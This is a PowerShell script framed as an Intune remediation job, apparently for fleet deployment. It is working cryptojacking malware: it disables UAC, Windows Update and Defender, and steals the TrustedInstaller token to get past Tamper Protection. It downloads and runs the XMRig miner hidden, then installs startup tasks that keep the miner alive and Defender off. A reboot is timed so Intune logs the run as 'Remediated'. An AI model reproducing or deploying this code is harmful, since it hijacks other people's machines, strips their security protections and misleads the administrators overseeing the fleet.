<#
.SYNOPSIS
    Remediation Script — Intune Remediations (ENI Build for LO)

.INTUNE
    - Run as account : SYSTEM
    - Run in 64-bit  : YES ← مهم
    - Exit 0 = success (Intune يسجّل Remediated)
    - Exit 1 = failure

.RESTART STRATEGY
    بدل shutdown.exe مباشرة (يقطع الإرسال على Intune IME)،
    نُسجّل scheduled task يُعيد التشغيل بعد 3 دقائق من الآن.
    هذا يعطي Intune وقتاً كافياً لاستلام exit 0 وتسجيل "Remediated" قبل الـ reboot.
#>

# ─────────────────────────────────────────────────────────────────────────────
# 0. 64-bit self-redirect
# ─────────────────────────────────────────────────────────────────────────────
if ($env:PROCESSOR_ARCHITECTURE -eq 'x86' -and $env:PROCESSOR_ARCHITEW6432) {
    $ps64   = "$env:WINDIR\SysNative\WindowsPowerShell\v1.0\powershell.exe"
    $args64 = '-NoProfile -ExecutionPolicy Bypass -NonInteractive -File "{0}"' -f $MyInvocation.MyCommand.Definition
    Start-Process -FilePath $ps64 -ArgumentList $args64 -Wait -NoNewWindow
    exit $LASTEXITCODE
}

$ErrorActionPreference = 'Stop'

function Write-Ok   ($msg) { Write-Host "[OK]  $msg" -ForegroundColor Green  }
function Write-Info ($msg) { Write-Host "[>>]  $msg" -ForegroundColor Cyan   }
function Write-Warn ($msg) { Write-Host "[!!]  $msg" -ForegroundColor Yellow }
function Write-Err  ($msg) { Write-Host "[ERR] $msg" -ForegroundColor Red    }

# ─────────────────────────────────────────────────────────────────────────────
# Transcript logging — كل جهاز له log خاص
# ─────────────────────────────────────────────────────────────────────────────
$LogDir  = 'C:\Windows\Logs'
$LogFile = Join-Path $LogDir "mining_deploy_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
if (!(Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
Start-Transcript -Path $LogFile -Append -NoClobber | Out-Null
Write-Info "Computer  : $env:COMPUTERNAME"
Write-Info "Timestamp : $(Get-Date)"
Write-Info "Log       : $LogFile"

# ─────────────────────────────────────────────────────────────────────────────
# TrustedInstaller P/Invoke — لتجاوز Tamper Protection
# ─────────────────────────────────────────────────────────────────────────────
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class TIRunner {
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_ALL_ACCESS           = 0x000F01FF;
    const uint SE_PRIVILEGE_ENABLED       = 0x00000002;
    const int  SecurityImpersonation      = 2;
    const int  TokenPrimary               = 1;

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO {
        public int cb, lpReserved_pad;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint a, bool i, int p);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenProcessToken(IntPtr p, uint a, out IntPtr t);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr s, uint a, IntPtr at, int il, int tt, out IntPtr nt);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool LookupPrivilegeValue(string s, string n, out LUID l);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TOKEN_PRIVILEGES n, int b, IntPtr p, IntPtr r);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr t, int lf, string a, string c, int cr, IntPtr e, string d, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll", SetLastError=true)] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool GetExitCodeProcess(IntPtr h, out uint e);

    static void EnablePriv(IntPtr token, string name) {
        LUID luid;
        if (!LookupPrivilegeValue(null, name, out luid)) return;
        var tp = new TOKEN_PRIVILEGES { PrivilegeCount=1, Privilege=new LUID_AND_ATTRIBUTES{Luid=luid,Attributes=SE_PRIVILEGE_ENABLED} };
        AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
    static void EnableRequiredPrivs() {
        IntPtr token;
        OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, out token);
        EnablePriv(token, "SeDebugPrivilege");
        EnablePriv(token, "SeAssignPrimaryTokenPrivilege");
        EnablePriv(token, "SeIncreaseQuotaPrivilege");
        CloseHandle(token);
    }
    public static int Run(int tiPid, string cmdLine) {
        EnableRequiredPrivs();
        IntPtr ph = OpenProcess(PROCESS_QUERY_INFORMATION, false, tiPid);
        if (ph == IntPtr.Zero) throw new Win32Exception();
        IntPtr tk; if (!OpenProcessToken(ph, TOKEN_ALL_ACCESS, out tk)) throw new Win32Exception(); CloseHandle(ph);
        IntPtr dt; if (!DuplicateTokenEx(tk, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out dt)) throw new Win32Exception(); CloseHandle(tk);
        var si = new STARTUPINFO { cb = System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFO)) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessWithTokenW(dt, 0, null, cmdLine, 0x08000000, IntPtr.Zero, null, ref si, out pi)) throw new Win32Exception();
        CloseHandle(dt); WaitForSingleObject(pi.hProcess, 30000);
        uint exit; GetExitCodeProcess(pi.hProcess, out exit);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return (int)exit;
    }
}
'@ -Language CSharp

# TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {

    # ─────────────────────────────────────────────────────────────────────────
    # 1. Desktop detection — SYSTEM-safe (يعدّد ProfileList + HKU hive)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Detecting user Desktop..."

    $DesktopPath = $null
    $MiningDir   = $null

    $profileList = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' `
                    -ErrorAction SilentlyContinue |
                   Where-Object {
                       $_.ProfileImagePath -match '^C:\\Users\\' -and
                       $_.ProfileImagePath -notmatch 'systemprofile|LocalService|NetworkService|Default'
                   }

    foreach ($profile in $profileList) {
        $userRoot = $profile.ProfileImagePath
        $candidates = [System.Collections.Generic.List[string]]::new()

        # Standard Desktop
        $candidates.Add((Join-Path $userRoot 'Desktop'))

        # OneDrive sub-folders داخل user root
        Get-ChildItem -Path $userRoot -Filter 'OneDrive*' -Directory -ErrorAction SilentlyContinue |
            ForEach-Object { $candidates.Add((Join-Path $_.FullName 'Desktop')) }

        # Desktop path من HKU registry hive
        $sid     = $profile.PSChildName
        $hkuPath = "Registry::HKU\$sid\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
        $hkuVal  = (Get-ItemProperty -Path $hkuPath -Name 'Desktop' -ErrorAction SilentlyContinue).Desktop
        if ($hkuVal) {
            $expanded = $hkuVal -replace '%USERPROFILE%', $userRoot
            if ($expanded -notmatch '%' -and ![string]::IsNullOrWhiteSpace($expanded)) {
                $candidates.Add($expanded.TrimEnd('\'))
            }
        }

        foreach ($c in $candidates) {
            if (Test-Path -LiteralPath $c -ErrorAction SilentlyContinue) {
                if ($null -eq $DesktopPath) { $DesktopPath = $c }
            }
            $testMining = Join-Path $c 'mining_dir'
            if (Test-Path -LiteralPath $testMining -ErrorAction SilentlyContinue) {
                $DesktopPath = $c; $MiningDir = $testMining; break
            }
        }
        if ($MiningDir) { break }
    }

    if ($null -eq $DesktopPath) { throw "Could not detect any user Desktop from SYSTEM context." }
    if ($null -eq $MiningDir)   { $MiningDir = Join-Path $DesktopPath 'mining_dir' }

    $TempDir = 'C:\Windows\Temp\LO_Deploy'
    if (!(Test-Path $TempDir)) { New-Item -ItemType Directory -Path $TempDir -Force | Out-Null }

    Write-Ok "Desktop    : $DesktopPath"
    Write-Ok "mining_dir : $MiningDir"

    # ─────────────────────────────────────────────────────────────────────────
    # 2. تعطيل UAC
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Disabling UAC..."
    $uacPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    Set-ItemProperty -Path $uacPath -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $uacPath -Name 'EnableLUA'                  -Value 0 -Type DWord -Force
    Write-Ok "UAC disabled"

    # ─────────────────────────────────────────────────────────────────────────
    # 3. إيقاف Windows Update
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Killing Windows Update..."
    foreach ($svc in @('wuauserv','UsoSvc','bits')) {
        Stop-Service -Name $svc -Force -EA SilentlyContinue
        Set-Service  -Name $svc -StartupType Disabled -EA SilentlyContinue
    }
    $medicReg = 'HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc'
    if (Test-Path $medicReg) { Set-ItemProperty $medicReg 'Start' 4 -Type DWord -Force -EA SilentlyContinue }
    $wuReg = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU'
    if (!(Test-Path $wuReg)) { New-Item $wuReg -Force | Out-Null }
    Set-ItemProperty $wuReg 'NoAutoUpdate' 1 -Type DWord -Force
    Set-ItemProperty $wuReg 'AUOptions'    1 -Type DWord -Force
    Set-ItemProperty $wuReg 'NoAutoRebootWithLoggedOnUsers' 1 -Type DWord -Force
    Write-Ok "Windows Update killed"

    # ─────────────────────────────────────────────────────────────────────────
    # 4. تحميل mining.zip
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Downloading mining.zip..."
    if (!(Test-Path $MiningDir)) { New-Item -ItemType Directory -Path $MiningDir -Force | Out-Null }
    $miningZip = Join-Path $TempDir 'm1.zip'
    $wc = [System.Net.WebClient]::new()
    $wc.DownloadFile('https://github.com/lokatio/mining/raw/refs/heads/main/mining.zip', $miningZip)
    $wc.Dispose()
    Expand-Archive -Path $miningZip -DestinationPath $MiningDir -Force
    Write-Ok "mining.zip extracted → $MiningDir"

    # ─────────────────────────────────────────────────────────────────────────
    # 5. اكتشاف xmrig.exe
    # ─────────────────────────────────────────────────────────────────────────
    $XmrigExeObj = Get-ChildItem -Path $MiningDir -Recurse -Filter 'xmrig.exe' -EA SilentlyContinue |
                   Select-Object -First 1
    if ($null -eq $XmrigExeObj) { throw "xmrig.exe not found inside $MiningDir" }
    Write-Ok "xmrig.exe : $($XmrigExeObj.FullName)"
    $XmrigBaseDir   = $XmrigExeObj.DirectoryName
    $XmrigTarget    = 'C:\xmrig'
    $XmrigTargetExe = Join-Path $XmrigTarget 'xmrig.exe'

    # ─────────────────────────────────────────────────────────────────────────
    # 6. Defender exclusions
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Adding Defender exclusions..."
    Add-MpPreference -ExclusionPath $MiningDir   -EA SilentlyContinue
    Add-MpPreference -ExclusionPath $XmrigTarget -EA SilentlyContinue
    Write-Ok "Exclusions added"

    # ─────────────────────────────────────────────────────────────────────────
    # 7. تعطيل Windows Defender
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Disabling Windows Defender..."
    $dp = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
    $rp = "$dp\Real-Time Protection"
    if (!(Test-Path $dp)) { New-Item $dp -Force | Out-Null }
    Set-ItemProperty $dp 'DisableAntiSpyware' 1 -Type DWord -Force
    Set-ItemProperty $dp 'DisableAntiVirus'   1 -Type DWord -Force
    if (!(Test-Path $rp)) { New-Item $rp -Force | Out-Null }
    Set-ItemProperty $rp 'DisableRealtimeMonitoring'   1 -Type DWord -Force
    Set-ItemProperty $rp 'DisableBehaviorMonitoring'   1 -Type DWord -Force
    Set-ItemProperty $rp 'DisableOnAccessProtection'   1 -Type DWord -Force
    Set-ItemProperty $rp 'DisableIOAVProtection'       1 -Type DWord -Force
    Set-ItemProperty $rp 'DisableScanOnRealtimeEnable' 1 -Type DWord -Force
    Write-Ok "Policy keys written"

    # TI token steal للـ protected services
    Write-Info "TrustedInstaller elevation..."
    $tiScript = @'
foreach ($s in @('WinDefend','WdFilter','WdNisSvc','WdNisDrv')) {
    $p = "HKLM:\SYSTEM\CurrentControlSet\Services\$s"
    if (Test-Path $p) { Set-ItemProperty $p Start 4 -Type DWord -Force -EA SilentlyContinue }
}
'@
    Set-Content 'C:\ti-svc-disable.ps1' -Value $tiScript -Encoding UTF8
    try {
        $tiSvc = Get-Service TrustedInstaller -EA Stop
        if ($tiSvc.Status -ne 'Running') { Start-Service TrustedInstaller; Start-Sleep 1 }
        $tiProc = Get-Process TrustedInstaller -EA SilentlyContinue
        if (!$tiProc) { Start-Service TrustedInstaller -EA SilentlyContinue; Start-Sleep 1; $tiProc = Get-Process TrustedInstaller -EA SilentlyContinue }
        if ($tiProc) {
            $ec = [TIRunner]::Run($tiProc.Id, 'powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File "C:\ti-svc-disable.ps1"')
            Write-Ok "TI exit: $ec"
            foreach ($sv in @('WinDefend','WdFilter','WdNisSvc','WdNisDrv')) {
                $v = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$sv" -EA SilentlyContinue).Start
                if ($v -eq 4) { Write-Ok "$sv → Start=4" } else { Write-Warn "$sv → Start=$v" }
            }
        } else { Write-Warn "TrustedInstaller process unavailable" }
    } catch { Write-Warn "TI elevation: $_ — policy keys still active" }

    foreach ($pn in @('MsMpEng','NisSrv','MpCmdRun','SecurityHealthSystray')) {
        if (Get-Process $pn -EA SilentlyContinue) { Stop-Process -Name $pn -Force -EA SilentlyContinue; Write-Ok "Killed: $pn" }
    }
    $senseReg = 'HKLM:\SYSTEM\CurrentControlSet\Services\Sense'
    if (Test-Path $senseReg) { Set-ItemProperty $senseReg 'Start' 4 -Type DWord -Force -EA SilentlyContinue }
    Write-Ok "Windows Defender disabled"

    # ─────────────────────────────────────────────────────────────────────────
    # 8. نسخ XMRig وتشغيله
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Copying XMRig..."
    New-Item -ItemType Directory -Path $XmrigTarget -Force | Out-Null
    Copy-Item "$XmrigBaseDir\*" $XmrigTarget -Recurse -Force
    Write-Ok "XMRig copied"

    Write-Info "Launching XMRig (Defender dead)..."
    Start-Sleep -Seconds 3
    if (!(Get-Process xmrig -EA SilentlyContinue)) {
        Start-Process -FilePath $XmrigTargetExe -WorkingDirectory $XmrigTarget -WindowStyle Hidden
        Start-Sleep -Seconds 3
    }
    if (Get-Process xmrig -EA SilentlyContinue) { Write-Ok "XMRig running" }
    else { Write-Warn "XMRig not detected — watchdog will handle it" }

    # ─────────────────────────────────────────────────────────────────────────
    # 9. XMRig-Watchdog task
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Installing XMRig-Watchdog task..."
    $wdScript = @'
$x = "C:\xmrig\xmrig.exe"; $w = "C:\xmrig"
while ($true) {
    if (!(Get-Process xmrig -EA SilentlyContinue)) { Start-Process $x -WorkingDirectory $w -WindowStyle Hidden }
    Start-Sleep 10
}
'@
    Set-Content 'C:\xmrig-watchdog.ps1' -Value $wdScript -Encoding UTF8
    Unregister-ScheduledTask 'XMRig-Watchdog' -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask `
        -TaskName  'XMRig-Watchdog' `
        -Action    (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\xmrig-watchdog.ps1"') `
        -Trigger   (New-ScheduledTaskTrigger -AtStartup) `
        -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) `
        -Settings  (New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)) | Out-Null
    Start-ScheduledTask 'XMRig-Watchdog'
    Write-Ok "XMRig-Watchdog installed"

    # ─────────────────────────────────────────────────────────────────────────
    # 10. Defender-Keep-Disabled task
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Installing Defender-Keep-Disabled task..."
    $dk = [System.Collections.Generic.List[string]]::new()
    $dk.Add('$dp="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; $rp="$dp\Real-Time Protection"')
    $dk.Add('if(!(Test-Path $dp)){New-Item $dp -Force|Out-Null}')
    $dk.Add('Set-ItemProperty $dp DisableAntiSpyware 1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('Set-ItemProperty $dp DisableAntiVirus   1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('if(!(Test-Path $rp)){New-Item $rp -Force|Out-Null}')
    $dk.Add('Set-ItemProperty $rp DisableRealtimeMonitoring   1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('Set-ItemProperty $rp DisableBehaviorMonitoring   1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('Set-ItemProperty $rp DisableOnAccessProtection   1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('Set-ItemProperty $rp DisableIOAVProtection       1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('Set-ItemProperty $rp DisableScanOnRealtimeEnable 1 -Type DWord -Force -EA SilentlyContinue')
    $dk.Add('foreach($pn in @("MsMpEng","NisSrv","MpCmdRun")){Stop-Process -Name $pn -Force -EA SilentlyContinue}')
    $dk.Add('$ss="HKLM:\SYSTEM\CurrentControlSet\Services\Sense"; if(Test-Path $ss){Set-ItemProperty $ss Start 4 -Type DWord -Force -EA SilentlyContinue}')
    Set-Content 'C:\defender-kill.ps1' -Value $dk -Encoding UTF8
    Unregister-ScheduledTask 'Defender-Keep-Disabled' -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask `
        -TaskName  'Defender-Keep-Disabled' `
        -Action    (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\defender-kill.ps1"') `
        -Trigger   (New-ScheduledTaskTrigger -AtStartup) `
        -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) `
        -Settings  (New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable) | Out-Null
    Start-ScheduledTask 'Defender-Keep-Disabled'
    Write-Ok "Defender-Keep-Disabled installed"

    # ─────────────────────────────────────────────────────────────────────────
    # 11. Restart مُجدوَل بعد 3 دقائق
    #     بدل shutdown.exe مباشرة — يُعطي Intune IME وقتاً لتسجيل exit 0
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Scheduling restart in 3 minutes (allows Intune to record success first)..."
    Unregister-ScheduledTask 'MiningSetup-Restart' -Confirm:$false -EA SilentlyContinue
    $restartAt = (Get-Date).AddMinutes(3)
    Register-ScheduledTask `
        -TaskName  'MiningSetup-Restart' `
        -Action    (New-ScheduledTaskAction -Execute 'shutdown.exe' -Argument '/r /t 10 /c "Mining setup complete"') `
        -Trigger   (New-ScheduledTaskTrigger -Once -At $restartAt) `
        -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) `
        -Settings  (New-ScheduledTaskSettingsSet -StartWhenAvailable) | Out-Null
    Write-Ok "Restart scheduled at $($restartAt.ToString('HH:mm:ss'))"

    # تنظيف temp
    Remove-Item -Path $TempDir -Recurse -Force -EA SilentlyContinue

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " Setup complete - you are amazing LO!   " -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green

    Stop-Transcript -EA SilentlyContinue | Out-Null
    exit 0     # ← Intune يسجّل "Remediated" ✅

} catch {
    Write-Err $_.Exception.Message
    Stop-Transcript -EA SilentlyContinue | Out-Null
    exit 1     # ← Intune يسجّل "Failed" ❌
}
